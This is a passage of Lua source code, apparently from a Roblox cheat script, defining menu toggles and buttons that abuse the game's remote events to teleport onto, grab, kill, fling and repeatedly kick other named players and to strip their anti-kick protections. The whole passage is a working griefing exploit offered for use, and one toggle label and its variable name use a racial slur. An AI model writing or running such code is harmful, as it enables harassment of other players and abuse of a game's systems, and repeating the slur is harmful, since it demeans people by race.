                        myHrp.AssemblyLinearVelocity = Vector3.zero
                    end)
                    task.wait(0.15)
                    for _ = 1, 15 do
                        local validTarget = nil
                        if typeof(targetPlayer) == "Instance" and targetPlayer:IsA("Player") then
                            validTarget = targetPlayer
                        end
                        local currentHumanoid = myChar:FindFirstChildOfClass("Humanoid")
                        if currentHumanoid and currentHumanoid.SeatPart and validTarget then
                            local seatParent = currentHumanoid.SeatPart.Parent
                            if seatParent and seatParent:FindFirstChild("LeftDetector") then
                                local grabArgs = {
                                    seatParent.LeftDetector,
                                    targetPlayer.Character.HumanoidRootPart,
                                    seatParent.LeftDetector:FindFirstChild("LeftWeld")
                                }
                                local creatureGrab = seatParent.BlobmanSeatAndOwnerScript.CreatureGrab
                                creatureGrab:FireServer(unpack(grabArgs))
                            end
                        end
                        task.wait(0.02)
                        local isGrabbed = false
                        if currentHumanoid and currentHumanoid.Sit and currentHumanoid.SeatPart and tostring(currentHumanoid.SeatPart.Parent) == "CreatureBlobman" then
                            _G.blobseat = currentHumanoid.SeatPart.Parent
                            local leftWeld = currentHumanoid.SeatPart.Parent:FindFirstChild("LeftDetector") and currentHumanoid.SeatPart.Parent.LeftDetector:FindFirstChild("LeftWeld")
                            if leftWeld and leftWeld.Attachment0 and leftWeld.Attachment0.Parent then
                                local grabbedPlayer = service.Players:GetPlayerFromCharacter(leftWeld.Attachment0.Parent.Parent)
                                if grabbedPlayer == targetPlayer then
                                    isGrabbed = true
                                end
                            end
                        end

                        if isGrabbed then break end
                    end
                    task.wait(0.04)
                    pcall(function()
                        myHrp.CFrame = originalCFrame
                        myHrp.AssemblyLinearVelocity = Vector3.zero
                    end)

                    task.wait(0.2)
                end
            end
            if humanoid2 then
                Camera.CameraSubject = humanoid2
            end
        end
    end
})

blobkill:AddToggle("blobkillLoop", {
    Text = "LoopKill",
    Default = false,
    Callback = function(Value)
        Config.Loopkillblob = Value
        if Value then
            if not Config.PlayerList or #Config.PlayerList == 0 then
                task.spawn(function()
                    Toggles.blobkillLoop:SetValue(false)
                end)
                return
            end
            local char = localPlayer.Character
            local hum = char:FindFirstChild("Humanoid") or char:WaitForChild("Humanoid")
            local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart")
            local oldCF = char:GetPivot()
            if Config.I9J0 == nil or not (Config.I9J0:FindFirstChild("VehicleSeat") ~= nil) or Config.I9J0.VehicleSeat.Occupant ~= hum then 
                Config.I9J0 = hum.SeatPart and hum.SeatPart:FindFirstAncestor("CreatureBlobman")
            end 
            local blob = Config.I9J0
            if not blob then
                if InPlot.Value and not InOwnedPlot.Value then 
                    InPlot:GetPropertyChangedSignal("Value"):Wait()
                end 
                if not CanSpawnToy.Value then 
                    CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                end
                local SpawnCF = (Config.A1B2 or hrp).CFrame * CFrame.new(0, 14, 20)
                local Container
                if InOwnedPlot.Value then
                    if Config.LastHouse == nil or Config.LastPlotOwner == nil or Config.LastPlotOwner.Parent == nil then 
                        for i = 1, 5 do 
                            local Plot = workspace.Plots["Plot"..i]
                            for _, v in pairs(Plot.PlotSign["ThisPlotsOwners"]:GetChildren()) do 
                                if v.Value == localPlayer.Name then 
                                    Config.LastHouse = workspace.PlotItems["Plot"..i]
                                    Config.LastPlotOwner = v 
                                    break
                                end
                            end
                            if Config.LastHouse then break end
                        end
                    end
                    Container = Config.LastHouse
                else
                    Container = SpawnedInToys
                end
                if Container then
                    local spawnedObject = nil
                    local connection
                    connection = Container.ChildAdded:Connect(function(child)
                        if child.Name == "CreatureBlobman" then
                            spawnedObject = child
                        end
                    end)
                    task.spawn(function()
                        pcall(function()
                            spawntoy("CreatureBlobman", SpawnCF, Vector3.zero)
                        end)
                    end)
                    local start = tick()
                    repeat task.wait() until spawnedObject or (tick() - start) > 2.5
                    connection:Disconnect()
                    blob = spawnedObject
                end
            end
            if not blob then return end
            local vSeat = blob:FindFirstChild("VehicleSeat") or blob:WaitForChild("VehicleSeat")
            vSeat:Sit(hum)
            local blobScript = blob:FindFirstChild("BlobmanSeatAndOwnerScript") or blob:WaitForChild("BlobmanSeatAndOwnerScript")
            local CreatureGrab = blobScript:FindFirstChild("CreatureGrab") or blobScript:WaitForChild("CreatureGrab")
            local CreatureRelease = blobScript:FindFirstChild("CreatureRelease") or blobScript:WaitForChild("CreatureRelease")
            local RightDetector = blob:FindFirstChild("RightDetector") or blob:WaitForChild("RightDetector")
            local RightWeld = RightDetector and (RightDetector:FindFirstChild("RightWeld") or RightDetector:WaitForChild("RightWeld"))
            while not hum.SeatPart do task.wait() end 
            task.spawn(function()
                while Config.Loopkillblob and task.wait() do  
                    if not Config.PlayerList or #Config.PlayerList == 0 then
                        task.wait(0.5)
                        continue
                    end
                    for _, playerName in ipairs(Config.PlayerList) do
                        if not Config.Loopkillblob then break end
                        local targetPlr = service.Players:FindFirstChild(playerName)
                        if not targetPlr or not targetPlr.Character then continue end
                        Config.C3D4 = targetPlr
                        Config.E5F6 = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
                        Config.G7H8 = targetPlr.Character:FindFirstChild("Humanoid")
                        local targetAboveLimit = true
                        if targetPlr and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
                            targetAboveLimit = targetPlr.Character.HumanoidRootPart.Position.Y > Config.HeightLimit
                        end
                        if (not Config.E5F6 or not Config.G7H8) or targetAboveLimit or Config.G7H8.Health == 0 then 
                            continue 
                        end 
                        oldCF = char:GetPivot() 
                        while not RightWeld.Attachment0 and Config.Loopkillblob do
                            task.wait(0.05)
                            Config.E5F6 = targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart")
                            Config.G7H8 = targetPlr.Character:FindFirstChild("Humanoid")
                            local loopTargetAboveLimit = true
                            if targetPlr and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
                                loopTargetAboveLimit = targetPlr.Character.HumanoidRootPart.Position.Y > Config.HeightLimit
                            end
                            if (not Config.E5F6 or not Config.G7H8) or loopTargetAboveLimit or Config.G7H8.Health == 0 then 
                                char:PivotTo(oldCF) 
                                break 
                            end 
                            if not hum.SeatPart then  
                                SpawnedInToys:FindFirstChild("CreatureBlobman").VehicleSeat:Sit(hum)
                            end 
                            char:PivotTo(Config.E5F6.CFrame)
                            hrp.AssemblyLinearVelocity = Vector3.zero
                            hrp.AssemblyAngularVelocity = Vector3.zero
                            CreatureGrab:FireServer(RightDetector, Config.E5F6, RightWeld)
                        end 
                        if not Config.Loopkillblob then break end
                        CreatureRelease:FireServer(RightWeld, Config.E5F6)
                        char:PivotTo(Config.E5F6.CFrame)
                        for _ = 1, 10 do 
                            hrp.AssemblyLinearVelocity = Vector3.zero
                            hrp.AssemblyAngularVelocity = Vector3.zero
                            CreatureGrab:FireServer(RightDetector, Config.E5F6, RightWeld)
                            CreatureRelease:FireServer(RightWeld, Config.E5F6)
                            if Config.E5F6 and Config.E5F6:IsDescendantOf(workspace) and Config.E5F6.ReceiveAge == 0 then  
                                Config.G7H8.BreakJointsOnDeath = false
                                Config.G7H8:ChangeState(Enum.HumanoidStateType.Dead)
                                Config.G7H8.Sit = false 
                                Config.G7H8.Jump = true
                            end 
                            task.wait()
                        end
                        char:PivotTo(oldCF)
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end)
        end
    end
})

blobkill:AddToggle("spamkickbl", {
    Text = "Loop Kick (Spam)",
    Default = false,
    Settings = false,
    Callback = function(on)
        Config.SpamkickblT = on
        
        local targetName = Config.PlayerList and Config.PlayerList[1]
        local targetPlayer = targetName and service.Players:FindFirstChild(targetName)

        if on and not targetPlayer then
            Config.SpamkickblT = false
            return
        end
        local char = localPlayer.Character
        local hum = char and char:FindFirstChild("Humanoid")
        local seat = hum and hum.SeatPart
        if on and (not seat or seat.Parent.Name ~= "CreatureBlobman") then
            Config.SpamkickblT = false
            return
        end
        if not on then
            Config.SpamkickblT = false
            return
        end
        task.spawn(function()
            local blob = seat.Parent
            local blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
            local scriptObj = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
            local CG = scriptObj and scriptObj:FindFirstChild("CreatureGrab")
            local CD = scriptObj and scriptObj:FindFirstChild("CreatureDrop")
            local R_Det = blob:FindFirstChild("RightDetector")
            local R_Weld = R_Det and (R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld"))
            local SavedPos = blobRoot.CFrame
            local packetCount = 0
            local wasDead = false
            local lockPos = SavedPos * CFrame.new(0, 19, 0)
            
            local function TeleportToTarget()
                local curTargetName = Config.PlayerList and Config.PlayerList[1]
                local curTarget = curTargetName and service.Players:FindFirstChild(curTargetName)
                if curTarget and curTarget.Character then
                    local tRoot = curTarget.Character:FindFirstChild("HumanoidRootPart")
                    if tRoot and blobRoot then
                        blobRoot.CFrame = tRoot.CFrame
                        blobRoot.Velocity = Vector3.zero
                        if CG and R_Det then CG:FireServer(R_Det, tRoot, R_Weld) end
                        if CreateGrabLine then CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false) end
                        local startTime = tick()
                        while tick() - startTime < 0.7 do
                            if SetNetworkOwner and tRoot.Parent then
                                SetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
                            end
                            service.RunService.Heartbeat:Wait()
                        end
                        blobRoot.CFrame = SavedPos
                        blobRoot.Velocity = Vector3.zero
                        startTime = tick()
                        while tick() - startTime < 0.7 do
                            if SetNetworkOwner and tRoot.Parent then
                                SetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
                            end
                            service.RunService.Heartbeat:Wait()
                        end
                    end
                end
            end

            TeleportToTarget()
            while Config.SpamkickblT do
                local curTargetName = Config.PlayerList and Config.PlayerList[1]
                local curTarget = curTargetName and service.Players:FindFirstChild(curTargetName)

                if not curTarget or not curTarget.Parent or not curTarget.Character then
                    Config.SpamkickblT = false
                    break
                end
                local tChar = curTarget.Character
                local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                local tHum = tChar and tChar:FindFirstChild("Humanoid")
                if not tHum or not tRoot then
                    service.RunService.Heartbeat:Wait()
                    continue
                end
                if tHum.Health > 0 and wasDead then
                    wasDead = false
                    TeleportToTarget()
                    service.RunService.Heartbeat:Wait()
                    continue
                end
                if tHum.Health <= 0 then
                    wasDead = true
                    service.RunService.Heartbeat:Wait()
                    continue
                end
                blobRoot.CFrame = SavedPos
                blobRoot.Velocity = Vector3.zero
                tRoot.CFrame = lockPos
                tRoot.Velocity = Vector3.zero
                tRoot.RotVelocity = Vector3.zero
                if tRoot.AssemblyLinearVelocity then
                    tRoot.AssemblyLinearVelocity = Vector3.zero
                    tRoot.AssemblyAngularVelocity = Vector3.zero
                end
                if SetNetworkOwner then SetNetworkOwner:FireServer(tRoot, lockPos) end
                packetCount = packetCount + 1
                if packetCount >= 2 then
                    packetCount = 0
                    tHum.PlatformStand = true
                    tHum.Sit = true
                    if R_Det then
                        local weld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
                        if weld and CD then CD:FireServer(weld) end
                    end
                    if DestroyGrabLine then DestroyGrabLine:FireServer(tRoot) end
                    if R_Det and CG then CG:FireServer(R_Det, tRoot, R_Weld) end
                    if CreateGrabLine then CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false) end
                end
                service.RunService.Heartbeat:Wait()
            end
            Config.SpamkickblT = false
            if blobRoot then
                blobRoot.CFrame = SavedPos
                blobRoot.Velocity = Vector3.zero
            end
        end)
    end
})

DestroyGucci:AddButton({
    Text = "Destroy Gucci [BLOB]",
    Func = function()
        local c, h = GetLocalCharAndHum()
        if not c or not h then return end
        local targets = Config.PlayerList or {}
        if type(targets) == "string" then targets = {targets} end
        for _, plrName in ipairs(targets) do
            local targetPLR = service.Players:FindFirstChild(plrName)
            local targetChar = targetPLR and targetPLR.Character
            local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
            local targetHum = targetChar and targetChar:FindFirstChild("Humanoid")
            if targetRoot and targetHum then
                local blob = Config.GucciBlob
                local vehicleSeat = blob and blob:FindFirstChild("VehicleSeat")
                if not blob or not vehicleSeat or vehicleSeat.Occupant ~= h then
                    blob = h.SeatPart and h.SeatPart:FindFirstAncestor("CreatureBlobman")
                end
                if not blob then
                    local inv = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                    local hrp = c:FindFirstChild("HumanoidRootPart")
                    if not hrp then return end
                    if InPlot.Value and not InOwnedPlot.Value then
                        InPlot:GetPropertyChangedSignal("Value"):Wait()
                    end
                    if not CanSpawnToy.Value then
                        CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                    end
                    local container
                    if InOwnedPlot.Value then
                        if Config.LastHouse == nil
                            or Config.LastPlotOwner == nil
                            or Config.LastPlotOwner.Parent == nil then
                            for i = 1, 5 do
                                local plot = workspace.Plots:FindFirstChild("Plot" .. i)
                                local sign = plot and plot:FindFirstChild("PlotSign")
                                local owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                                if owners then
                                    for _, owner in pairs(owners:GetChildren()) do
                                        if owner.Value == localPlayer.Name then
                                            Config.LastHouse = workspace.PlotItems:FindFirstChild("Plot" .. i)
                                            Config.LastPlotOwner = owner
                                            break
                                        end
                                    end
                                end
                                if Config.LastHouse then break end
                            end
                        end
                        container = Config.LastHouse
                    else
                        container = inv
                    end
                    if not container then return end
                    local spawnedObject
                    local connection = container.ChildAdded:Connect(function(child)
                        if child.Name == "CreatureBlobman" then
                            spawnedObject = child
                        end
                    end)
                    task.spawn(function()
						pcall(function()
							spawntoy(
								"CreatureBlobman",
								hrp.CFrame * CFrame.new(0, 14, 20),
								Vector3.zero
							)
						end)
					end)
                    local start = tick()
                    repeat
                        task.wait()
                    until spawnedObject or tick() - start > 2.5
                    connection:Disconnect()
                    blob = spawnedObject
                end
                if blob then
                    local oldCF = c:GetPivot()
                    targetRoot.Massless = false
                    local seat = FWD(blob, "VehicleSeat")
                    if seat then
                        seat:Sit(h)
                        local waitStart = tick()
                        while not h.SeatPart and tick() - waitStart < 3 do
                            task.wait()
                        end
                        if h.SeatPart then
                            local script = FWD(blob, "BlobmanSeatAndOwnerScript")
                            local CreatureGrab = FWD(script, "CreatureGrab")
                            local CreatureRelease = FWD(script, "CreatureRelease")
                            local RightDetector = FWD(blob, "RightDetector")
                            local RightWeld = RightDetector and FWD(RightDetector, "RightWeld")
                            blob:PivotTo(targetRoot.CFrame)
                            task.wait(0.15)
                            for _ = 1, 15 do
                                CreatureGrab:FireServer(RightDetector, targetRoot, RightWeld)
                                CreatureRelease:FireServer(RightWeld, targetRoot)
                                targetRoot.Massless = false
                                for _ = 1, 10 do
                                    targetHum.Sit = true
                                end
                                task.wait()
                            end
                            c:PivotTo(oldCF)
                        end
                    end
                end
            end
        end
    end
})

DestroyGucci:AddButton({
    Text = "Destroy Gucci[Jump/Sit]",
    Func = function()
        local c, h = GetLocalCharAndHum()
        if not c or not h then return end
        local targets = Config.PlayerList or {}
        if type(targets) == "string" then targets = {targets} end
        local oldCF = c:GetPivot()
        for _, plrName in ipairs(targets) do
            local blobs = {}
            local tarInv = workspace:FindFirstChild(plrName .. "SpawnedInToys")
            if tarInv then
                for _, v in pairs(tarInv:GetChildren()) do
                    if v.Name == "CreatureBlobman" or v.Name:sub(1, 7) == "Tractor" then
                        table.insert(blobs, v)
                    end
                end
            end
            for _, plot in pairs(workspace.Plots:GetChildren()) do
                for _, owner in pairs(plot.PlotSign.ThisPlotsOwners:GetChildren()) do
                    if owner.Value == plrName then
                        local toyFolder = workspace.PlotItems:FindFirstChild(plot.Name)

                        if toyFolder then
                            for _, v in pairs(toyFolder:GetChildren()) do
                                if v.Name == "CreatureBlobman" or v.Name:sub(1, 7) == "Tractor" then
                                    table.insert(blobs, v)
                                end
                            end
                        end
                    end
                end
            end
            for _, v in pairs(blobs) do
                for _ = 1, 2 do
                    local seat = v:FindFirstChild("VehicleSeat")
                    if not seat then break end
                    seat:Sit(h)
                    local waitStart = tick()
                    while not seat.Occupant and tick() - waitStart < 2 do
                        task.wait()
                    end
                    c:PivotTo(oldCF)
                    h:ChangeState(Enum.HumanoidStateType.Jumping)
                    local stopPart = c.PrimaryPart or c
                    if stopPart:IsA("BasePart") then
                        stopPart.AssemblyLinearVelocity = Vector3.zero
                        stopPart.AssemblyAngularVelocity = Vector3.zero
                    end
                    task.wait(0.1)
                end
                local stopPart = c.PrimaryPart or c
                if stopPart:IsA("BasePart") then
                    stopPart.AssemblyLinearVelocity = Vector3.zero
                    stopPart.AssemblyAngularVelocity = Vector3.zero
                end
                c:PivotTo(oldCF)
            end
        end
    end
})

RemoveKickanti:AddToggle("RemoveWdantikick", {
    Text = "Remove Anti-Kick [WD]",
    Default = false,
    Callback = function(Value)
        Config.TarAntiAntikickWD = Value
        if Value then 
            local WD = inv:FindFirstChild("SprayCanWD")
            local SoundPart = WD and WD:FindFirstChild("SoundPart")
            local targetName = Config.PlayerList and Config.PlayerList[1]
            Config.TarAntikickRoot = targetName and service.Players:FindFirstChild(targetName) and service.Players:FindFirstChild(targetName).Character and service.Players:FindFirstChild(targetName).Character:FindFirstChild("HumanoidRootPart")

            if not WD then 
                WD = spawntoy("SprayCanWD", CFrame.new(0, 5, 0))
                repeat task.wait() until WD and WD:FindFirstChild("SoundPart") or not Config.TarAntiAntikickWD
                SoundPart = WD:FindFirstChild("SoundPart") or WD:WaitForChild("SoundPart",3)
                
                if WD then
                    for _,v in pairs(WD:GetChildren()) do 
                        if v:IsA("BasePart") and v.Name ~= "GrabParts" then  
                            v.CanCollide = false
                        end
                    end
                end

                task.delay(1, function()
                    if not WD then return end
                    local ToCheckName = WD.Name
                    local OriginalName = WD.Name
                    local index = nil
                    for i,v in pairs(inv:GetChildren()) do 
                        if v.Name == ToCheckName then index = i end 
                    end
                    if index == nil then return end 
                    local contents = localPlayer.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents
                    for i,v in ipairs(contents:GetChildren()) do
                        if v.Name == OriginalName and i == index then
                            local view = v.ViewItemButton
                            view.Text = "Anti-AntiKick"
                            view.TextScaled = true
                            view.LowResImage.Image = ""
                        end
                    end
                end)
            end

            local HitBox = FWD(WD,"Hitbox")
            repeat  
                if HitBox then
                    SetNetworkOwner:FireServer(HitBox, HitBox.CFrame)
                end
                task.wait(0.05)
            until not HitBox.Parent or not Config.TarAntiAntikickWD or HitBox:FindFirstChild("PartOwner")

            while Config.TarAntiAntikickWD and task.wait(0.2) do
                SoundPart = WD and WD.Parent and WD:FindFirstChild("SoundPart")
                targetName = Config.PlayerList and Config.PlayerList[1]
                Config.TarAntikickRoot = targetName and service.Players:FindFirstChild(targetName) and service.Players:FindFirstChild(targetName).Character and service.Players:FindFirstChild(targetName).Character:FindFirstChild("HumanoidRootPart")
                if not Config.TarAntikickRoot then  
                    repeat
                        targetName = Config.PlayerList and Config.PlayerList[1]
                        Config.TarAntikickRoot = targetName and service.Players:FindFirstChild(targetName) and service.Players:FindFirstChild(targetName).Character and service.Players:FindFirstChild(targetName).Character:FindFirstChild("HumanoidRootPart")
                        task.wait(0.1)
                    until Config.TarAntikickRoot or not Config.TarAntiAntikickWD
                end
                if not SoundPart then  
                    WD = spawntoy("SprayCanWD", CFrame.new(0, 5, 0))
                    repeat task.wait() until WD and WD:FindFirstChild("SoundPart") or not Config.TarAntiAntikickWD
                    SoundPart = WD:FindFirstChild("SoundPart") or WD:WaitForChild("SoundPart",3)
                    
                    if WD then
                        for _,v in pairs(WD:GetChildren()) do 
                            if v:IsA("BasePart") and v.Name ~= "GrabParts" then  
                                v.CanCollide = false
                            end
                        end
                    end

                    HitBox = FWD(WD,"Hitbox")
                    repeat  
                        if HitBox then
                            SetNetworkOwner:FireServer(HitBox, HitBox.CFrame)
                        end
                        task.wait(0.05)
                    until not HitBox.Parent or HitBox:FindFirstChild("PartOwner") or not Config.TarAntiAntikickWD
                    
                    task.delay(1, function()
                        if not WD then return end
                        local ToCheckName = WD.Name
                        local OriginalName = WD.Name
                        local index = nil
                        for i,v in pairs(inv:GetChildren()) do 
                            if v.Name == ToCheckName then index = i end 
                        end
                        if index == nil then return end 
                        local contents = localPlayer.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents
                        for i,v in ipairs(contents:GetChildren()) do
                            if v.Name == OriginalName and i == index then
                                local view = v.ViewItemButton
                                view.Text = "Anti-Antikick"
                                view.TextScaled = true
                                view.LowResImage.Image = ""
                            end
                        end
                    end)
                end
                SoundPart.CFrame = Config.TarAntikickRoot.CFrame * CFrame.new(0,0,4)
                task.wait()
                SoundPart.CFrame = CFrame.new(-382.838318, 41.6491699, 665.570251)
                SoundPart.AssemblyAngularVelocity = Vector3.zero
                SoundPart.AssemblyLinearVelocity = Vector3.zero
            end
        end
    end
})

Loop2:AddToggle("FireT", {
    Text = "Loop Fire",
    Default = false,
    Callback = function(Value)
        Config.FireLoop = Value
        if Value then
            task.spawn(function()
                while Config.FireLoop do
                    spawntoy("Campfire", HRP().CFrame * CFrame.new(0, 3, 4), Vector3.zero)
                    local spawnedInToys = service.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
                    local Fireee = spawnedInToys:WaitForChild("Campfire", 3)
                    if not Fireee or not Config.FireLoop then break end
                    Fireee.Name = "CampLoop"
                    task.wait(.1)
                    if Fireee:FindFirstChild("SoundPart") then
                        SetNetworkOwner:FireServer(Fireee.SoundPart, HRP().CFrame)
                    end
                    local function flingVec(min, max)
                        return Vector3.new(
                            math.random(min, max),
                            math.random(min, max),
                            math.random(min, max)
                        )
                    end
                    while Config.FireLoop and Fireee and Fireee.Parent == spawnedInToys do
                        for _, playerName in ipairs(Config.PlayerList or {}) do
                            if not Config.FireLoop or not Fireee or Fireee.Parent ~= spawnedInToys then break end
                            local targetPlayer = service.Players:FindFirstChild(playerName)
                            if not targetPlayer or targetPlayer == localPlayer then continue end
                            local character = targetPlayer.Character
                            if not character then continue end
                            local root = character:FindFirstChild("HumanoidRootPart")
                            if not root then continue end
                            if Fireee and Fireee:FindFirstChild("SoundPart") then
                                local soundPart = Fireee.SoundPart
                                local backOffset = CFrame.new(0, 0, 3)
                                soundPart.CFrame = root.CFrame * backOffset
                                soundPart.AssemblyLinearVelocity  = flingVec(-100, 130)
                                soundPart.AssemblyAngularVelocity = flingVec(-500, 500)
                            end
                            task.wait(.1)
                        end
                        task.wait(.05)
                    end
                    if not Config.FireLoop then
                        if Fireee and Fireee.Name == "CampLoop" then
                            DestroyToy:FireServer(Fireee)
                        end
                        break
                    end
                end
            end)
        end
    end,
})

Loop2:AddToggle("BananaT", {
    Text = "Loop Banana",
    Default = false,
    Callback = function(Value)
        local char = GetCharacter()
        Config.BananaLoop = Value
        if Value then
            task.spawn(function()
                local banana, SoundPart, AlignPos, Atach
                local function flingVec(min, max)
                    return Vector3.new(
                        math.random(min, max),
                        math.random(min, max),
                        math.random(min, max)
                    )
                end
                while Config.BananaLoop do
                    task.wait(0.05)
                    local validTargets = {}
                    for _, playerName in ipairs(Config.PlayerList or {}) do
                        local targetPlr = service.Players:FindFirstChild(playerName)
                        if targetPlr
                           and targetPlr ~= localPlayer
                           and not ragdolallwhite(targetPlr)
                           and not IsPlayerInsideSafeZone(targetPlr)
                           and targetPlr.Character
                           and targetPlr.Character:FindFirstChild("Left Leg") then
                            table.insert(validTargets, targetPlr)
                        end
                    end
                    if #validTargets == 0 then
                        task.wait(0.5)
                        continue
                    end
                    local targetPlr = validTargets[math.random(1, #validTargets)]
                    local targetLeg = targetPlr.Character:FindFirstChild("Left Leg")
                    local targetAttach = targetLeg and targetLeg:FindFirstChild("LeftFootAttachment")
                    if not targetAttach then continue end
                    if banana and not banana.Parent then
                        banana = nil
                        SoundPart = nil
                    else
                        banana = SpawnedInToys:FindFirstChild("FoodBanana")
                    end
                    SoundPart = banana and banana:FindFirstChild("SoundPart")
                    if not SoundPart then
                        for _, v in pairs(SpawnedInToys:GetChildren()) do
                            if v.Name == "FoodBanana" then
                                DestroyToy:FireServer(v)
                            end
                        end
                        if InPlot.Value and not InOwnedPlot.Value then
                            InPlot:GetPropertyChangedSignal("Value"):Wait()
                        end
                        if not CanSpawnToy.Value then
                            CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                        end
                        local hrp = HRP()
                        local SpawnCF = hrp.CFrame * CFrame.new(0, 14, 20)
                        local Container = InOwnedPlot.Value and Config.LastHouse or SpawnedInToys
                        if Container then
                            local spawnedObject = nil
                            local connection = Container.ChildAdded:Connect(function(child)
                                if child.Name == "FoodBanana" then
                                    spawnedObject = child
                                end
                            end)
                            pcall(function()
                                spawntoy("FoodBanana", SpawnCF, Vector3.zero)
                            end)
                            local start = tick()
                            repeat task.wait() until spawnedObject or (tick() - start) > 1.5
                            connection:Disconnect()
                            banana = spawnedObject
                        end
                        if not banana then continue end
                        SoundPart = banana:FindFirstChild("SoundPart") or banana:WaitForChild("SoundPart", 2)
                        if not SoundPart then continue end
                        local holdPart = banana:FindFirstChild("HoldPart") or banana:WaitForChild("HoldPart", 2)
                        if holdPart then
                            local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction") or holdPart:WaitForChild("HoldItemRemoteFunction")
                            if holdRemote then holdRemote:InvokeServer(banana, char) end
                        end
                        UseRemote:FireServer(banana)
                        while Config.BananaLoop and (banana:FindFirstChild("EdiblePart") ~= nil) do task.wait() end
                        if not Config.BananaLoop then break end
                        UseRemote:FireServer(banana)
                        if holdPart then
                            local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction") or holdPart:WaitForChild("DropItemRemoteFunction")
                            if dropRemote then dropRemote:InvokeServer(banana, char:GetPivot() * CFrame.new(0, 15, -10), Vector3.zero) end
                        end
                        repeat
                            SoundPart = banana and banana:FindFirstChild("SoundPart")
                            if not SoundPart then break end
                            SetNetworkOwner:FireServer(SoundPart, SoundPart.CFrame)
                            task.wait()
                        until not Config.BananaLoop or not SoundPart or (SoundPart:FindFirstChild("PartOwner") ~= nil)
                        if not Config.BananaLoop then break end
                        DestroyGrabLine:FireServer(SoundPart)
                        Atach = Instance.new("Attachment")
                        Atach.Parent = SoundPart
                        AlignPos = Instance.new("AlignPosition")
                        AlignPos.MaxForce = math.huge
                        AlignPos.MaxVelocity = math.huge
                        AlignPos.Responsiveness = 200
                        AlignPos.Parent = SoundPart
                        AlignPos.Attachment0 = Atach
                    end
                    local isOwner = true
                    for _, v in pairs(banana:GetChildren()) do
                        if (v:FindFirstChild("PartOwner") ~= nil) and v["PartOwner"].Value ~= localPlayer.Name then
                            DestroyToy:FireServer(banana)
                            banana = nil
                            isOwner = false
                            break
                        end
                    end
                    if not isOwner or not banana then continue end
                    AlignPos = SoundPart:FindFirstChild("AlignPosition")
                    if not AlignPos then
                        DestroyToy:FireServer(banana)
                        banana = nil
                        continue
                    end
                    AlignPos.Attachment1 = targetAttach
                    SoundPart.AssemblyLinearVelocity  = flingVec(-100, 130)
                    SoundPart.AssemblyAngularVelocity = flingVec(-500, 500)

                    task.wait(0.3)
                end
                if banana then
                    if AlignPos then AlignPos:Destroy() end
                    DestroyToy:FireServer(banana)
                end
            end)
        else
            for _, v in pairs(SpawnedInToys:GetChildren()) do
                if v.Name == "FoodBanana" then
                    DestroyToy:FireServer(v)
                end
            end
        end
    end
})

Loop2:AddToggle("LoopdarkT", {
    Text = "Loop Nigger",
    Default = false,
    Callback = function(Value)
        Config.niggerLoop = Value
        if Value then
            task.spawn(function()
                while Config.niggerLoop do
                    spawntoy("OvenDarkGray", HRP().CFrame * CFrame.new(0, 3, 4), Vector3.zero)
                    local spawnedInToys = service.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
                    local Oven = spawnedInToys:WaitForChild("OvenDarkGray", 3)
                    if not Oven or not Config.niggerLoop then break end
                    Oven.Name = "BurnOvenDarkGray"
                    local Button = Oven:FindFirstChild("ButtonOven")
                    if Button then
                        SetNetworkOwner:FireServer(Button, HRP().CFrame)
                        DestroyGrabLine:FireServer(Button)
                    end
                    task.wait(.1)
                    if Oven:FindFirstChild("SoundPart") then
                        SetNetworkOwner:FireServer(Oven.SoundPart, HRP().CFrame)
                    end
                    local function flingVec(min, max)
                        return Vector3.new(
                            math.random(min, max),
                            math.random(min, max),
                            math.random(min, max)
                        )
                    end
                    while Config.niggerLoop and Oven and Oven.Parent == spawnedInToys do
                        for _, playerName in ipairs(Config.PlayerList or {}) do
                            if not Config.niggerLoop or not Oven or Oven.Parent ~= spawnedInToys then break end
                            local targetPlayer = service.Players:FindFirstChild(playerName)
                            if not targetPlayer or targetPlayer == localPlayer then continue end
                            local character = targetPlayer.Character
                            if not character then continue end
                            local root = character:FindFirstChild("HumanoidRootPart")
                            if not root then continue end
                            if Oven and Oven:FindFirstChild("SoundPart") then
                                local soundPart = Oven.SoundPart
                                local backOffset = CFrame.new(0, 0, 3)
                                local targetCFrame = root.CFrame * backOffset
                                soundPart.CFrame = targetCFrame
                                soundPart.AssemblyLinearVelocity  = flingVec(-100, 130)
                                soundPart.AssemblyAngularVelocity = flingVec(-500, 500)
                            end
                            task.wait(.1)
                        end
                        task.wait(.05)
                    end
                    
                    if not Config.niggerLoop then
                        if Oven and Oven.Name == "BurnOvenDarkGray" then
                            DestroyToy:FireServer(Oven)
                        end
                        break
                    end
                end
            end)
        end
    end,
})

Rei:AddButton({
    Text = "Decoy Fling",
    Callback = function()
        local decoy = spawntoy("YouDecoy", CFrame.new(3, 4, 0))
        if not decoy then return end
        decoy.Name = "FLINGDECOY"
